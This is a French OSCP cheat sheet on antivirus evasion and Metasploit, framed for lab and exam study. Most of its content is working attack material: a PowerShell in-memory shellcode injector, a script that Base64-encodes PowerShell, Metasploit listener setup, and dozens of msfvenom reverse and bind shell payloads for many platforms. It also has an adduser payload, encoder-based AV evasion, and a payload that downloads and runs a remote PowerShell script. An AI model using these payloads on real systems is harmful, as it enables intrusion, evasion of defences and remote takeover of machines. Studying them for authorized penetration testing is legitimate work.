---
title: "OSCP · Antivirus et Metasploit"
description: "Références sur les protections, charges utiles et outils de laboratoire."
---

# OSCP · Antivirus et Metasploit

Références sur les protections, charges utiles et outils de laboratoire.


## Injection en mémoire avec un script PowerShell

Examiner les entrées et les réponses de l'application web.


### Charge utile (Payload)


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f powershell -v sc

```


### Scénario


<p class="oscp-command-note">PowerShell : définir les imports de fonctions Win32 employés par l'exemple de mémoire.</p>

```powershell
# Importer les fonctions nécessaires de kernel32.dll et msvcrt.dll
$importCode = '
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll", SetLastError=false)]
public static extern IntPtr memset(IntPtr dest, int c, UInt32 count);
';

# Ajouter les fonctions importées à la session PowerShell
$win32Functions = Add-Type -MemberDefinition $importCode -Name "Win32API" -Namespace "Win32" -PassThru;

# Définir le code shell (remplacer avec le code shell réel)
[Byte[]] $shellcode = [PLACE YOUR SHELLCODE HERE];

# Attribuer la mémoire pour le code shell
$memSize = 0x1000;
if ($shellcode.Length -gt $memSize) { $memSize = $shellcode.Length };
$allocatedMemory = $win32Functions::VirtualAlloc([IntPtr]::Zero, $memSize, 0x3000, 0x40);

# Copier le code shell dans la mémoire attribuée
for ($i = 0; $i -lt $shellcode.Length; $i++) {
    $win32Functions::memset($allocatedMemory + $i, $shellcode[$i], 1);
}

# Exécuter le code shell dans un nouveau thread
$win32Functions::CreateThread([IntPtr]::Zero, 0, $allocatedMemory, [IntPtr]::Zero, 0, [IntPtr]::Zero);

# Gardez le script en cours d'exécution
# Cette partie du script garantit que le processus PowerShell ne se termine pas immédiatement après l'exécution du shellcode.
# Si le script sort trop tôt, le thread créé pour exécuter le shellcode pourrait être mis fin, arrêtant le shellcode.
# En gardant le script en vie avec une boucle infinie et une commande de sommeil, le shellcode dispose de suffisamment de temps pour fonctionner.
while ($true) {
    Start-Sleep 60;
}

```


<p class="oscp-command-note">Extrait de code source Python de l'outil présenté : ne pas le lancer ligne par ligne.</p>

```python
#!/usr/bin/env python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__version__ = '0.1'
__author__ = 'Carlos Perez, Carlos_Perez@darkoperator.com'
__doc__ = """
PSEncoder http://www.darkoperator.com by Carlos Perez, Darkoperator

Encodes a given Windows PowerShell script in to a Base64 String that can be
passed to the powershell.exe program as an option.
"""
import base64
import sys
import re
import os
import getopt

def powershell_encode(data):
    # La commande vide conserve la variable Unicode préparée.
    blank_command = ""
    powershell_command = ""
    # Supprimer les caractères parasites éventuellement ajoutés par PowerShell ISE
    n = re.compile(u'(\xef|\xbb|\xbf)')
    # Parcourir chaque caractère puis insérer l'octet nul.
    for char in (n.sub("", data)):
        # insert the nullbyte
        blank_command += char + "\x00"
    # assigner la commande powershell comme la nouvelle commande
    powershell_command = blank_command
    # base64 code la commande powershell
    powershell_command = base64.b64encode(powershell_command.encode())
    return powershell_command.decode("utf-8")

def usage():
    print("Version: {0}".format(__version__))
    print("Usage: {0} <options>\n".format(sys.argv[0]))
    print("Options:")
    print("   -h, --help                  Show this help message and exit")
    print("   -s, --script      <script>  PowerShell Script.")
    sys.exit(0)

def main():
    try:
        options, args = getopt.getopt(sys.argv[1:], 'hs:', ['help', 'script='])
    except getopt.GetoptError:
        print("Wrong Option Provided!")
        usage()
    if len(sys.argv) == 1:
        usage()

    for opt, arg in options:
        if opt in ('-h', '--help'):
            usage()
        elif opt in ('-s', '--script'):
            script_file = arg
            if not os.path.isfile(script_file):
                print("The specified powershell script does not exists")
                sys.exit(1)
            else:
                ps_script = open(script_file, 'r').read()
                print(powershell_encode(ps_script))

if __name__ == "__main__":
    main()

```



### Vérifier la configuration de Defender

Lire l'état du moteur et les dernières mises à jour de signatures, sans désactiver la protection.

<p class="oscp-command-note">Vérifier la configuration de Defender.</p>

```powershell
Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntivirusSignatureLastUpdated
```

## Shellter (outil automatisé)




```text
apt-cache search shellter && sudo apt install shellter

```


<p class="oscp-command-note">Gérer les paquets Debian/Ubuntu.</p>

```bash
sudo apt install wine

```


<p class="oscp-command-note">Syntaxe ou résultat illustratif pour «Shellter (outil automatisé)» (ne pas exécuter comme une commande).</p>

```text
dpkg --add-architecture i386 && apt-get update && apt-get install wine32

```


<p class="oscp-command-note">Ouvrir la console Metasploit.</p>

```text
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST [IP];set LPORT [PORT];run;"

```


## Metasploit




```bash
sudo msfdb init
sudo systemctl enable postgresql
sudo msfconsole

```




```text
workspace -a [nameToGive]

```




```text
search type:auxiliary smb

```




```text
services -p 445 --rhosts

```


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
# Afficher les charges utiles disponibles
msfvenom -l payloads

# Liste des options de charge utile
msfvenom -p [PAYLOAD] --list-options

# Payload encoding
msfvenom -p [PAYLOAD] -e [ENCODER] -f [FORMAT] -i [ENCODE] [COUNT_OF_ENCODING] LHOST=[IP] LPORT=[PORT]

```


### Écouteurs réseau (Listeners)


<p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>

```bash
# Utilisation de Netcat, pour NON-Stage charges utiles ONLY.
nc -nvlp <LISTENING_PORT>

# Utilisation de Métasploit (usage interdit dans l'examen)
msf>use exploit/multi/handler  
msf>set payload windows/meterpreter/reverse_tcp  
msf>set lhost <IP>  
msf>set lport <PORT>  
msf> set ExitOnSession false  
msf>exploit -j

# Pour obtenir plusieurs sessions sur un seul multi/handler, vous devez définir l'option ExitOnSession à faux et lancer l'exploit -j au lieu de simplement l'exploit; l'option -j est de garder toute la session connectée en arrière-plan.

```


### Charges utiles principales (Payloads)


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
# Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

# Apache Tomcat (JSP)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp

# Apache Tomcat (WAR)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp

# ASPX
msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<443> -o shell64.aspx

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh

# JavaScript Shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f js_le -o shellcode

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl

# PHP: nous devons ajouter le <?php à la première ligne du fichier afin qu'il s'exécute en tant que page web PHP
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php

cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

# Python
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

```


### Charges utiles complémentaires (Payloads)


**msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf**


<p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf

```


**msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf**




```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf

```


**msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf**




```bash
msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf

```


**msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf**




```bash
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf

```


**msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe**




```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

```


```bash
# Générer une charge utile avec msfvenom
msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe

```


**msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe**




```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f exe > shell.exe

```


**msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe**




```bash
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

```


**msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe**




```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe

```


**msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe**




```bash
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe

```


**msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho**




```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho

```


**msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho**




```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho

```


**msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py**




```bash
msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py

```


**msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh**




```bash
msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh

```


**msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl**




```bash
msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl

```


**msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp**




```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp

```


**msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp**




```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp

```


**msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war**




```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war

```


**msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php**




```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php

```


**msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php**




```bash
msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php

```


```bash
# Générer une charge utile avec msfvenom
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('[http://IP/nishang.ps1')\](http://ip/nishang.ps1')%5C)"" -f python

```


**msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"**




```bash
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"

```


**msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"**




```bash
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"

```



### Identifier la version de Metasploit

Afficher la version du framework sans lancer de module d'exploitation.

<p class="oscp-command-note">Identifier la version de Metasploit.</p>

```bash
msfconsole -q -x 'version; exit'
```

### Lister les architectures et plateformes

Examiner la liste des cibles reconnues par l'installation locale de msfvenom.

<p class="oscp-command-note">Lister les architectures et plateformes.</p>

```bash
msfvenom --list archs
msfvenom --list platforms
```

## Vérifier les formats et options de msfvenom

Avant de générer un fichier dans un laboratoire, consulter les charges utiles et les formats réellement proposés par la version locale de Metasploit. Une charge utile ne garantit ni compatibilité ni exécution.

### Afficher les formats compatibles

Lister les formats disponibles avec la version locale de msfvenom.

<p class="oscp-command-note">Afficher les formats compatibles.</p>

```bash
msfvenom --list formats
```

### Afficher les encodeurs disponibles

Consulter les encodeurs installés. L'encodage n'est pas une garantie de contournement antivirus.

<p class="oscp-command-note">Afficher les encodeurs disponibles.</p>

```bash
msfvenom --list encoders
```

### Consulter les options d'une charge utile

Vérifier les paramètres obligatoires d'une charge utile avant toute utilisation en environnement autorisé.

<p class="oscp-command-note">Consulter les options d'une charge utile.</p>

```bash
msfvenom -p windows/x64/shell_reverse_tcp --list-options
```

**Référence complémentaire :** [krovs/oscp-notes](https://github.com/krovs/oscp-notes/blob/main/docs/13_exploitation.md). Explications rédigées pour SKILL-ISSUE.

<!-- notes-krovs-2026 -->

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
